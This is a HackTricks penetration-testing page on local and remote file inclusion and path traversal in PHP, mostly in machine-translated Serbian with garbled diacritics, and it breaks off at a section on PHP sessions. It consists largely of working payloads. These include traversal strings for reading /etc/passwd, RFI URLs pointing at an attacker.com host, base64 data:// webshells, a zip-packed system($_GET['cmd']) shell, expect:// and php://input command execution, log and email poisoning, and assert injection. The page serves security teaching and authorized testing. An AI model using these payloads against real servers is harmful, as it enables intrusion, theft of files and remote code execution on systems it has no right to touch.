# Ukljuƒçivanje fajlova/Putanja prelaz

{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Pridru≈æite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na gre≈°ke!

**Hakerski Uvidi**\
Ukljuƒçite se u sadr≈æaj koji istra≈æuje uzbuƒëenje i izazove hakovanja

**Vesti o Haku u Realnom Vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovija Obave≈°tenja**\
Budite informisani o najnovijim nagradama za gre≈°ke i va≈ænim a≈æuriranjima platformi

**Pridru≈æite nam se na** [**Discordu**](https://discord.com/invite/N3FrSbmwdy) i poƒçnite da saraƒëujete sa vrhunskim hakerima danas!

## Ukljuƒçivanje fajlova

**Ukljuƒçivanje udaljenog fajla (RFI):** Fajl se uƒçitava sa udaljenog servera (Najbolje: Mo≈æete napisati kod i server ƒáe ga izvr≈°iti). U php je ovo **onemoguƒáeno** po defaultu (**allow\_url\_include**).\
**Ukljuƒçivanje lokalnog fajla (LFI):** Server uƒçitava lokalni fajl.

Ranljivost se javlja kada korisnik mo≈æe na neki naƒçin kontrolisati fajl koji ƒáe server uƒçitati.

Ranljive **PHP funkcije**: require, require\_once, include, include\_once

Zanimljiv alat za iskori≈°ƒáavanje ove ranjivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Zanimljivi - LFI2RCE fajlovi
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Kombinovanjem nekoliko \*nix LFI lista i dodavanjem vi≈°e putanja, kreirao sam ovu:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Poku≈°ajte takoƒëe da promenite `/` u `\`\
Poku≈°ajte takoƒëe da dodate `../../../../../`

Lista koja koristi nekoliko tehnika za pronala≈æenje datoteke /etc/password (da proveri da li ranjivost postoji) mo≈æe se naƒái [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spajanje razliƒçitih reƒçnika:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Poku≈°ajte takoƒëe da promenite `/` u `\`\
Poku≈°ajte takoƒëe da uklonite `C:/` i dodate `../../../../../`

Lista koja koristi nekoliko tehnika za pronala≈æenje datoteke /boot.ini (da proveri da li ranjivost postoji) mo≈æe se naƒái [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu za linux.

## Osnovni LFI i zaobila≈æenja

Svi primeri su za Local File Inclusion, ali se mogu primeniti i na Remote File Inclusion (stranica=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sekvence prolaza uklonjene ne-rekurzivno
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Zaobiƒëite dodavanje vi≈°e karaktera na kraju datog stringa (zaobila≈æenje: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ovo je **re≈°eno od PHP 5.4**

### **Kodiranje**

Mo≈æete koristiti nestandardna kodiranja kao ≈°to su dvostruko URL kodiranje (i druga):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Iz postojeƒáe fascikle

Mo≈æda back-end proverava putanju fascikle:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Istra≈æivanje direktorijuma datoteƒçnog sistema na serveru

Datoteƒçni sistem servera mo≈æe se istra≈æivati rekurzivno kako bi se identifikovali direktorijumi, a ne samo datoteke, kori≈°ƒáenjem odreƒëenih tehnika. Ovaj proces ukljuƒçuje odreƒëivanje dubine direktorijuma i ispitivanje postojanja specifiƒçnih foldera. Ispod je detaljna metoda za postizanje ovoga:

1. **Odredite dubinu direktorijuma:** Utvrdite dubinu va≈°eg trenutnog direktorijuma uspe≈°nim preuzimanjem datoteke `/etc/passwd` (primenjivo ako je server zasnovan na Linux-u). Primer URL-a mo≈æe biti strukturiran na sledeƒái naƒçin, ukazujuƒái na dubinu od tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Istra≈æi foldere:** Dodajte ime sumnjivog foldera (npr., `private`) na URL, a zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva poveƒáanje dubine za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tumaƒçenje Ishoda:** Odgovor servera ukazuje da li folder postoji:
* **Gre≈°ka / Nema Izlaza:** Folder `private` verovatno ne postoji na navedenoj lokaciji.
* **Sadr≈æaj `/etc/passwd`:** Prisutnost foldera `private` je potvrƒëena.
4. **Rekurzivna Istra≈æivanja:** Otkriƒáe foldera mo≈æe se dodatno istra≈æiti za poddirektorijume ili datoteke koristeƒái istu tehniku ili tradicionalne metode Lokalnog Ukljuƒçivanja Datoteka (LFI).

Za istra≈æivanje direktorijuma na razliƒçitim lokacijama u fajl sistemu, prilagodite payload u skladu s tim. Na primer, da proverite da li `/var/www/` sadr≈æi `private` direktorijum (pretpostavljajuƒái da je trenutni direktorijum na dubini od 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Tehnika skraƒáivanja putanje**

Skraƒáivanje putanje je metoda koja se koristi za manipulaciju putanjama datoteka u web aplikacijama. ƒåesto se koristi za pristup ograniƒçenim datotekama zaobila≈æenjem odreƒëenih sigurnosnih mera koje dodaju dodatne karaktere na kraj putanja datoteka. Cilj je kreirati putanju datoteke koja, kada je izmenjena od strane sigurnosne mere, i dalje pokazuje na ≈æeljenu datoteku.

U PHP-u, razliƒçite reprezentacije putanje datoteke mogu se smatrati ekvivalentnim zbog prirode datoteƒçnog sistema. Na primer:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, i `/etc/passwd/` se svi tretiraju kao ista putanja.
* Kada su poslednjih 6 karaktera `passwd`, dodavanje `/` (ƒçime se dobija `passwd/`) ne menja ciljanju datoteku.
* Sliƒçno, ako se `.php` doda putanji datoteke (kao ≈°to je `shellcode.php`), dodavanje `/.` na kraju neƒáe promeniti datoteku koja se pristupa.

Pru≈æeni primeri pokazuju kako koristiti skraƒáivanje putanje za pristup `/etc/passwd`, uobiƒçajenom cilju zbog svog osetljivog sadr≈æaja (informacije o korisniƒçkim raƒçunima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj potrebnih prelaza mo≈æe biti oko 2027, ali ovaj broj mo≈æe varirati u zavisnosti od konfiguracije servera.

* **Kori≈°ƒáenje taƒçaka i dodatnih karaktera**: Sekvence prelaza (`../`) u kombinaciji sa dodatnim taƒçkama i karakterima mogu se koristiti za navigaciju kroz fajl sistem, efikasno ignorirajuƒái dodatne stringove koje server dodaje.
* **Odreƒëivanje potrebnog broja prelaza**: Kroz poku≈°aje i gre≈°ke, mo≈æe se pronaƒái precizan broj `../` sekvenci potrebnih za navigaciju do root direktorijuma, a zatim do `/etc/passwd`, osiguravajuƒái da su svi dodati stringovi (kao ≈°to je `.php`) neutralisani, ali da ≈æeljeni put (`/etc/passwd`) ostane netaknut.
* **Poƒçetak sa la≈ænim direktorijumom**: Uobiƒçajena praksa je da se put zapoƒçne sa nepostojeƒáim direktorijumom (kao ≈°to je `a/`). Ova tehnika se koristi kao mera predostro≈ænosti ili da bi se ispunili zahtevi logike parsiranja putanje servera.

Kada se koriste tehnike skraƒáivanja putanje, kljuƒçno je razumeti pona≈°anje servera prilikom parsiranja putanje i strukturu fajl sistema. Svaki scenario mo≈æe zahtevati drugaƒçiji pristup, a testiranje je ƒçesto neophodno da bi se prona≈°la najefikasnija metoda.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Trikovi za zaobila≈æenje filtera**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

U php-u je ovo podrazumevano onemoguƒáeno jer je **`allow_url_include`** **Iskljuƒçeno.** Mora biti **Ukljuƒçeno** da bi radilo, i u tom sluƒçaju mo≈æete ukljuƒçiti PHP datoteku sa va≈°eg servera i dobiti RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako je iz nekog razloga **`allow_url_include`** **Ukljuƒçeno**, ali PHP **filtrira** pristup spoljnim veb stranicama, [prema ovom postu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), mogli biste koristiti, na primer, data protokol sa base64 za dekodiranje b64 PHP koda i dobijanje RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
U prethodnom kodu, konaƒçni `+.txt` je dodat jer je napadaƒçu bila potrebna string koja se zavr≈°ava sa `.txt`, tako da se string zavr≈°ava tim i nakon b64 dekodiranja taj deo ƒáe vratiti samo smeƒáe, a pravi PHP kod ƒáe biti ukljuƒçen (i stoga, izvr≈°en).
{% endhint %}

Jo≈° jedan primer **koji ne koristi `php://` protokol** bio bi:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Root element

U Python-u u kodu poput ovog:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **apsolutnu putanju** do **`file_name`**, **prethodna putanja se jednostavno uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To je oƒçekivano pona≈°anje prema [dokumentaciji](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od komponente apsolutne putanje.

## Java Lista direktorijuma

Izgleda da ako imate Path Traversal u Javi i **tra≈æite direktorijum** umesto datoteke, **vraƒáa se lista direktorijuma**. Ovo se neƒáe de≈°avati u drugim jezicima (koliko ja znam).

## Top 25 parametara

Evo liste top 25 parametara koji bi mogli biti podlo≈æni lokalnim ranjivostima ukljuƒçivanja datoteka (LFI) (iz [linka](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI koristeƒái PHP omotaƒçe i protokole

### php://filter

PHP filteri omoguƒáavaju osnovne **operacije modifikacije podataka** pre nego ≈°to budu proƒçitani ili napisani. Postoji 5 kategorija filtera:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Uklanja oznake iz podataka (sve izmeƒëu "<" i ">" karaktera)
* Imajte na umu da je ovaj filter nestao iz modernih verzija PHP-a
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transformi≈°e u drugaƒçiju kodiranje(`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih podr≈æanih kodiranja**, pokrenite u konzoli: `iconv -l`

{% hint style="warning" %}
Zloupotrebljavajuƒái `convert.iconv.*` konverzijski filter mo≈æete **generisati proizvoljan tekst**, ≈°to mo≈æe biti korisno za pisanje proizvoljnog teksta ili pravljenje funkcije kao ≈°to je ukljuƒçivanje procesa proizvoljnog teksta. Za vi≈°e informacija pogledajte [**LFI2RCE putem php filtera**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Kompresuje sadr≈æaj (korisno ako se exfiltrira mnogo informacija)
* `zlib.inflate`: Dekompresuje podatke
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Zastarjelo
* `mdecrypt.*` : Zastarjelo
* Ostali filteri
* Pokretanjem u php `var_dump(stream_get_filters());` mo≈æete pronaƒái nekoliko **neoƒçekivanih filtera**:
* `consumed`
* `dechunk`: obrƒáe HTTP chunked encoding
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
Deo "php://filter" nije osetljiv na velika i mala slova
{% endhint %}

### Kori≈°ƒáenje php filtera kao orakla za ƒçitanje proizvoljnih fajlova

[**U ovom postu**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) predlo≈æena je tehnika za ƒçitanje lokalnog fajla bez vraƒáanja izlaza sa servera. Ova tehnika se zasniva na **boolean ekfiltraciji fajla (karakter po karakter) koristeƒái php filtere** kao orakl. To je zato ≈°to se php filteri mogu koristiti za poveƒáanje teksta dovoljno da php izazove izuzetak.

U originalnom postu mo≈æete pronaƒái detaljno obja≈°njenje tehnike, ali evo brzog pregleda:

* Koristite kodek **`UCS-4LE`** da ostavite vodeƒái karakter teksta na poƒçetku i poveƒáate veliƒçinu stringa eksponencijalno.
* Ovo ƒáe se koristiti za generisanje **teksta toliko velikog kada je poƒçetno slovo taƒçno pogoƒëeno** da ƒáe php izazvati **gre≈°ku**.
* Filter **dechunk** ƒáe **ukloniti sve ako prvi karakter nije heksadecimalni**, tako da mo≈æemo znati da li je prvi karakter heks.
* Ovo, u kombinaciji sa prethodnim (i drugim filtrima u zavisnosti od pogoƒëenog slova), omoguƒáiƒáe nam da pogodimo slovo na poƒçetku teksta gledajuƒái kada uradimo dovoljno transformacija da ga uƒçinimo neheksadecimalnim karakterom. Jer ako je heks, dechunk ga neƒáe obrisati i poƒçetna bomba ƒáe izazvati php gre≈°ku.
* Kodek **convert.iconv.UNICODE.CP930** transformi≈°e svako slovo u sledeƒáe (tako da nakon ovog kodeka: a -> b). Ovo nam omoguƒáava da otkrijemo da li je prvo slovo `a`, na primer, jer ako primenimo 6 ovog kodeka a->b->c->d->e->f->g slovo vi≈°e nije heksadecimalni karakter, stoga dechunk ga nije obrisao i php gre≈°ka se izaziva jer se mno≈æi sa poƒçetnom bombom.
* Kori≈°ƒáenjem drugih transformacija kao ≈°to je **rot13** na poƒçetku moguƒáe je ekfiltrirati druge karaktere kao n, o, p, q, r (i drugi kodeci se mogu koristiti za pomeranje drugih slova u heks opseg).
* Kada je poƒçetni karakter broj, potrebno je da se base64 kodira i ekfiltrira prva 2 slova da bi se ekfiltrirao broj.
* Konaƒçni problem je videti **kako ekfiltrirati vi≈°e od poƒçetnog slova**. Kori≈°ƒáenjem filtera za redosled memorije kao ≈°to su **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** moguƒáe je promeniti redosled karaktera i dobiti na prvoj poziciji druga slova teksta.
* I kako bismo mogli da dobijemo **dalje podatke**, ideja je da **generi≈°emo 2 bajta sme≈°nih podataka na poƒçetku** sa **convert.iconv.UTF16.UTF16**, primenimo **UCS-4LE** da bi se **povezali sa sledeƒáa 2 bajta**, i **obri≈°emo podatke do sme≈°nih podataka** (ovo ƒáe ukloniti prva 2 bajta poƒçetnog teksta). Nastavite to da radite dok ne doƒëete do ≈æeljenog bita za ekfiltraciju.

U postu je takoƒëe otkriven alat za automatsko izvoƒëenje ovoga: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Ovaj omotaƒç omoguƒáava pristup deskriptorima fajlova koje proces ima otvorene. Potencijalno korisno za ekfiltraciju sadr≈æaja otvorenih fajlova:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Mo≈æete takoƒëe koristiti **php://stdin, php://stdout i php://stderr** za pristup **fajl deskriptorima 0, 1 i 2** respektivno (nisam siguran kako bi ovo moglo biti korisno u napadu)

### zip:// i rar://

Otpremite Zip ili Rar fajl sa PHPShell unutar i pristupite mu.\
Da biste mogli da zloupotrebite rar protokol, **mora biti posebno aktiviran**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Napomena da je ovaj protokol ograniƒçen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Mo≈æete izvr≈°iti kod koristeƒái ovo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Defini≈°ite svoj payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar` datoteka se mo≈æe koristiti za izvr≈°avanje PHP koda kada web aplikacija koristi funkcije kao ≈°to su `include` za uƒçitavanje datoteka. PHP kod ispod prikazuje kreiranje `.phar` datoteke:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Da biste kompajlirali `.phar` datoteku, treba izvr≈°iti sledeƒáu komandu:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Write in memory or in a temporary file (not sure how this can be useful in a file inclusion attack)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Accessing local filesystem
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Accessing HTTP(s) URLs
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Accessing FTP(s) URLs
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Compression Streams
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Audio streams (Not useful to read arbitrary files)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) risks in PHP are notably high when dealing with the 'assert' function, which can execute code within strings. This is particularly problematic if input containing directory traversal characters like ".." is being checked but not properly sanitized.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Dok ovo ima za cilj da zaustavi prolazak, nenamerno stvara vektor za injekciju koda. Da bi iskoristio ovo za ƒçitanje sadr≈æaja datoteka, napadaƒç bi mogao da koristi:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Sliƒçno, za izvr≈°avanje proizvoljnih sistemskih komandi, mo≈æe se koristiti:
```plaintext
' and die(system("id")) or '
```
Va≈æno je **URL-enkodirati ove payload-e**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Pridru≈æite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na gre≈°ke!

**Hacking Insights**\
Ukljuƒçite se u sadr≈æaj koji se bavi uzbuƒëenjem i izazovima hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Latest Announcements**\
Budite informisani o najnovijim nagradama za gre≈°ke i va≈ænim a≈æuriranjima platforme

**Pridru≈æite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i poƒçnite da saraƒëujete sa vrhunskim hakerima danas!

## PHP Blind Path Traversal

{% hint style="warning" %}
Ova tehnika je relevantna u sluƒçajevima kada **kontroli≈°ete** **putanju fajla** PHP funkcije koja ƒáe **pristupiti fajlu** ali neƒáete videti sadr≈æaj fajla (kao jednostavan poziv na **`file()`**) ali sadr≈æaj nije prikazan.
{% endhint %}

U [**ovom neverovatnom postu**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) obja≈°njeno je kako se slepa putanja mo≈æe zloupotrebiti putem PHP filtera da se **izvr≈°i eksfiltracija sadr≈æaja fajla putem gre≈°ke orakla**.

Ukratko, tehnika koristi **"UCS-4LE" kodiranje** da bi sadr≈æaj fajla bio toliko **velik** da ƒáe **PHP funkcija koja otvara** fajl izazvati **gre≈°ku**.

Zatim, da bi se otkrio prvi karakter, koristi se filter **`dechunk`** zajedno sa drugim kao ≈°to su **base64** ili **rot13**, a na kraju se koriste filteri **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** da se **postave drugi karakteri na poƒçetak i otkriju**.

**Funkcije koje bi mogle biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (samo ciljani read only sa ovim)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehniƒçke detalje proverite pomenuti post!

## LFI2RCE

### Remote File Inclusion

Obja≈°njeno ranije, [**pratite ovu vezu**](./#remote-file-inclusion).

### Putem Apache/Nginx log fajla

Ako je Apache ili Nginx server **ranjiv na LFI** unutar include funkcije, mogli biste poku≈°ati da pristupite **`/var/log/apache2/access.log` ili `/var/log/nginx/access.log`**, postavite unutar **user agent-a** ili unutar **GET parametra** php shell kao **`<?php system($_GET['c']); ?>`** i ukljuƒçite taj fajl

{% hint style="warning" %}
Imajte na umu da **ako koristite dvostruke navodnike** za shell umesto **jednostavnih navodnika**, dvostruki navodnici ƒáe biti modifikovani za string "_**quote;**_", **PHP ƒáe baciti gre≈°ku** tamo i **ni≈°ta drugo neƒáe biti izvr≈°eno**.

Takoƒëe, uverite se da **ispravno pi≈°ete payload** ili ƒáe PHP gre≈°iti svaki put kada poku≈°a da uƒçita log fajl i neƒáete imati drugu priliku.
{% endhint %}

Ovo se takoƒëe mo≈æe uraditi u drugim logovima, ali **budite oprezni**, kod unutar logova mo≈æe biti URL enkodiran i to mo≈æe uni≈°titi Shell. Header **authorisation "basic"** sadr≈æi "user:password" u Base64 i dekodira se unutar logova. PHPShell mo≈æe biti umetnut unutar ovog header-a.\
Ostale moguƒáe putanje logova:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Po≈°aljite mail** na interni nalog (user@localhost) koji sadr≈æi va≈° PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i poku≈°ajte da ukljuƒçite u mail korisnika sa putanjom kao **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Uƒçitajte puno shell-ova (na primer: 100)
2. Ukljuƒçite [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), sa $PID = PID procesa (mo≈æe se brute force-ovati) i $FD datoteka deskriptora (takoƒëe mo≈æe da se brute force-uje)

### Via /proc/self/environ

Kao log fajl, po≈°aljite payload u User-Agent, biƒáe reflektovan unutar /proc/self/environ fajla
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Ako mo≈æete da otpremite datoteku, jednostavno ubacite shell payload u nju (npr: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da bi se datoteka odr≈æala ƒçitljivom, najbolje je ubrizgati u metapodatke slika/doc/pdf

### Putem uƒçitavanja Zip datoteke

Uƒçitajte ZIP datoteku koja sadr≈æi PHP shell kompresovanu i pristupite:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sesije

Proverite da li veb sajt koristi PHP sesiju (PHPSESSID)
```
